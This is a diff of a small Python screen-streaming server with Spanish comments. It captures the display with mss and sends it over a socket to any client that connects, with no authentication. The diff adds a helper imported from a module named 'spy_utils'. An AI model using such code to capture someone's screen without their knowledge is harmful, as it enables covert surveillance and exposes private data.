@@ -1,8 +1,9 @@
 import socket
-import time
 import pickle
+import time
 import numpy as np
 import mss
+from spy_utils import send_screen_capture
 
 # Crear un socket de servidor
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,6 +16,7 @@ try:
     # Aceptar una conexión
     client_socket, client_address = server_socket.accept()
     print(f"Conexión aceptada de {client_address}")
+
 
     with mss.mss() as sct:
         while True:
@@ -38,9 +40,10 @@ try:
             # Esperar un poco antes de capturar de nuevo (para no saturar la red)
             time.sleep(0.1)
 
+    send_screen_capture(client_socket, delay=0.1)
+
 except socket.error as e:
     print(f"Error de conexión: {e}")
-
 finally:
     client_socket.close()
     server_socket.close()
